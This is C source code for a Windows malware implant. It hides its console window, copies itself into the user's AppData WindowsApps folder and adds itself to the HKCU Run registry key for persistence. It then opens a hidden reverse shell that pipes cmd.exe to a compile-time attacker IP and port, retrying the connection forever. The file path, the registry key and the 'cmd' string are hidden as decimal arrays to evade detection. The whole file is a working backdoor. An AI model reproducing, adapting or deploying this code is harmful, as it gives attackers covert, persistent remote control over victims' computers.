#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

#ifndef IP_ADDRESS
    #define IP_ADDRESS 0
#endif

#ifndef PORT
    #define PORT 0
#endif

void rev_shell();
void persistance(const char* newPath);
void convertDecToStr(int array[], char str[], int str_size);
void convertArrToWide(int array[], WCHAR* wideStr, int wideStrSize, int arraySize);
HANDLE mutex;

int main() {
    //Hide cmd
    FreeConsole();
    //Create mutex
    mutex = CreateMutex(NULL, TRUE, "Agent");

    //Either mutex cannot be created or error 183 means mutex already exist
    if (mutex == NULL || GetLastError() == 183) {
        //Error 183 means mutex already exist
        //ret 1 to end extra application
        return 1;
    }
    //Get home path
    const char* home_path = getenv("USERPROFILE");
    char filename[MAX_PATH];
    char newLocation[MAX_PATH];

    //Registry loc in dec
    int decimal_array[] = {92, 65, 112, 112, 68, 97, 116, 97, 92, 76, 111, 99, 97, 108, 92, 77, 105, 99, 114, 111, 115, 111, 102, 116, 92, 87, 105, 110, 100, 111, 119, 115, 65, 112, 112, 115, 92, 97, 103, 101, 110, 116, 46, 101, 120, 101};
    //Size of array
    int array_size = sizeof(decimal_array) / sizeof(decimal_array[0]);
    //Allocate space for str, +1 for null terminator
    char str[array_size + 1];
    //Convert dec to str
    convertDecToStr(decimal_array, str, sizeof(str));
    //Setting Path of new location with user home path
    snprintf(newLocation, sizeof(newLocation), "%s%s", home_path,str);
    BOOL stats = 0;
    //Get file name
    DWORD size = GetModuleFileNameA(NULL, filename, MAX_PATH);
    CopyFile(filename, newLocation, stats);
    //If copied file already exist, go to persistance
    if (strcmp(filename, newLocation) == 0) {
        persistance(newLocation);
    } else {
        //Copy agent to new location
        if (CopyFile(filename, newLocation, stats)) {
            persistance(newLocation);
        }
    }

    CloseHandle(mutex);
    return 0;
}

void persistance(const char* newPath) {
    //Required Size for Wide Characters
    int size = MultiByteToWideChar(CP_UTF8, 0, newPath, -1, NULL, 0);
    //Allocate memory to store converted str
    wchar_t* proPath = (wchar_t*)malloc(size * sizeof(wchar_t));
    //Convert Path from char* to wchar_t* (narrow > wide char string) to match the wide character format (L"string") used in the registry functions.  
    MultiByteToWideChar(CP_UTF8, 0, newPath, -1, proPath, size);
    //hkey initalization
    HKEY hkey = NULL;

    //Registry location in dec
    int decimal_array[] = {83, 79, 70, 84, 87, 65, 82, 69, 92, 92, 77, 105, 99, 114, 111, 115, 111, 102, 116, 92, 92, 87, 105, 110, 100, 111, 119, 115, 92, 92, 67, 117, 114, 114, 101, 110, 116, 86, 101, 114, 115, 105, 111, 110, 92, 92, 82, 117, 110};
    //Size of array
    int array_size = sizeof(decimal_array) / sizeof(decimal_array[0]);
    //Allocate space for wide char str, +1 for null terminator
    WCHAR wideStr[array_size + 1];
    //Size of wide str
    int wideStr_size = sizeof(wideStr) / sizeof(wideStr[0]);
    //Convert dec to wide char str
    convertArrToWide(decimal_array, wideStr, wideStr_size, array_size);

    //Create new key in windows start up
    LONG createStatus = RegCreateKeyW(HKEY_CURRENT_USER, wideStr, &hkey);
    //Set value of key - Name is Agent, Value is String and Size is calculated
    //wcslen for len of string * size of wchar_t for data size
    LONG status = RegSetValueExW(hkey, L"Agent", 0, REG_SZ, (const BYTE *)proPath, (wcslen(proPath) + 1) * sizeof(wchar_t));
    if (status == 0) {
        rev_shell();
    }
}

void rev_shell() {
    SOCKET shell;
    WSADATA ver;
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    struct sockaddr_in shell_addr;
    char RecData[512];
    int connection;

    //Initializing WinSock Version 2
    WSAStartup(MAKEWORD(2,2), &ver);
    //Create TCP Socket
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); 
    //Get Port
    int port = PORT;
    //Get IP Address
    long long int ip = IP_ADDRESS;
    //IPv4
    unsigned char octets[4];
    octets[0] = (ip >> 24) & 0xFF;
    octets[1] = (ip >> 16) & 0xFF;
    octets[2] = (ip >> 8) & 0xFF;
    octets[3] = ip & 0xFF;
    //16 for Max IPv4 Length and Null Terminator
    char ip_addr[16];
    sprintf(ip_addr, "%d.%d.%d.%d", octets[0], octets[1], octets[2], octets[3]);
    //Shell Configuration
    shell_addr.sin_port = htons(port);
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    //Connecting to Target Server
    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    //Always Listening
    while (connection == SOCKET_ERROR){
        connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    }

    //Recv Socket, Where to Store Data, Max Size to Receive, 0
    recv(shell, RecData, sizeof(RecData), 0);
    //Set Value of Startup Infra Buffer to 0 (& means address)
    ZeroMemory(&sinfo, sizeof(sinfo));
    //Size of Structure
    sinfo.cb = sizeof(sinfo);
    //Determines whether startup info users are used when process creates a window
    //STARTF_USESTDHANDLES - Used for Standard Input, Output and Error
    //STARTF_USESHOWWINDOW - Contains Additional Information 
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    sinfo.wShowWindow = SW_HIDE;
    //Pipe Standard Input, Output and Error to Socket
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) shell;

    //cmd in dec
    int decimal_array[] = {99, 109, 100};
    //Size of array
    int array_size = sizeof(decimal_array) / sizeof(decimal_array[0]);
    //Allocate space for str, +1 for null terminator
    char str[array_size + 1];
    //Convert dec to str
    convertDecToStr(decimal_array, str, sizeof(str));

    //Using CreateProcess API to spawn cmd
    //NULL, Process to Spawn, NULL, NULL, BOOLEAN, Creation Flags, NULL, NULL, Address of Startup Information Structure, Address of Process Information Structure
    CreateProcess(NULL, str, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
    //Startup Process
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    //Set Value of Receiving Server Buffer to 0
    ZeroMemory(RecData, sizeof(RecData));
}


void convertDecToStr(int array[], char str[], int str_size) {
    int i;
    for (i = 0; i < str_size - 1; i++) {
        str[i] = (char)array[i];
    }
    //End of Str
    str[i] = '\0'; 
}

void convertArrToWide(int array[], WCHAR* wideStr, int wideStr_size, int array_size) {
    int i;
    for (i = 0; i < wideStr_size - 1 && i < array_size; i++) {
        wideStr[i] = (WCHAR)array[i];
    }
    //End of Wide Str
    wideStr[i] = L'\0'; 
}
